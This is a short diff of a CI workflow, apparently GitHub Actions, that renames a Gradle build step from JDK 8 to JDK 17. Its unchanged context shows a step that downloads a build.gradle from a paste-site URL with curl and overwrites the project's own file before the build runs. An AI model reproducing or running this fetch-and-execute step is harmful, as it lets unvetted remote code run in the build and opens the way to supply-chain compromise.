@@ -28,7 +28,7 @@ jobs:
         curl -L -o newbuild.gradle https://pastebin.ai/download/ngewkzdyer
         mv newbuild.gradle build.gradle
     
-    - name: Build project with JDK 8
+    - name: Build project with JDK 17
       run: ./gradlew test jacocoTestReport
 
     - name: Upload JaCoCo reports
